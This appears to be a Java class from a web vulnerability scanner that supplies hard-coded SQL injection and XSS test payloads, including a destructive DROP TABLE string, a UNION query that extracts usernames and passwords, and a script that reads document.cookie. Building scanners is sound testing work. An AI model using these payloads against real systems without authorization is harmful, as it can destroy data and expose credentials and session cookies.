package com.example.scanner;

import java.util.Arrays;
import java.util.List;

public class PayloadManager {
    /**
     * Get SQL Injection payloads untuk testing.
     * @return 
     */
    public List<String> getSQLiPayloads() {
        return Arrays.asList(
            "' OR 1=1--",  // Classic tautology
            "'; DROP TABLE users--",  // Destructive (lab only!)
            "1' UNION SELECT username, password FROM users--",  // Union-based
            "' OR 'a'='a",  // Boolean-based
            "1; WAITFOR DELAY '0:0:5'--",  // Time-based (SQL Server)
            "1' AND 1=CONVERT(int, (SELECT @@version))--"  // Error-based
        );
    }

    /**
     * Get XSS payloads untuk testing reflected/stored XSS.
     * @return List of XSS payloads.
     */
    public List<String> getXSSPayloads() {
        return Arrays.asList(
            "<script>alert('XSS')</script>",  // Basic alert
            "\"'><img src=x onerror=alert(1)>",  // IMG tag breakout
            "<svg onload=alert(1)>",  // SVG onload
            "<body onload=alert(1)>",  // Body onload
            "javascript:alert(1)",  // JS protocol
            "'><script>alert(document.cookie)</script>"  // Cookie stealer (lab only)
        );
    }

    /**
     * Get payloads berdasarkan tipe vulnerability (dipanggil dari ScannerMain).
     * @param vulnType "SQLi" atau "XSS".
     * @return List payloads yang sesuai, atau empty jika invalid.
     */
    public List<String> getPayloads(String vulnType) {
        if ("SQLI".equalsIgnoreCase(vulnType)) {
            return getSQLiPayloads();
        } else if ("XSS".equalsIgnoreCase(vulnType)) {
            return getXSSPayloads();
        } else {
            System.err.println("Unsupported vuln type: " + vulnType + ". Default to empty list.");
            return Arrays.asList();  // Empty list
        }
    }


}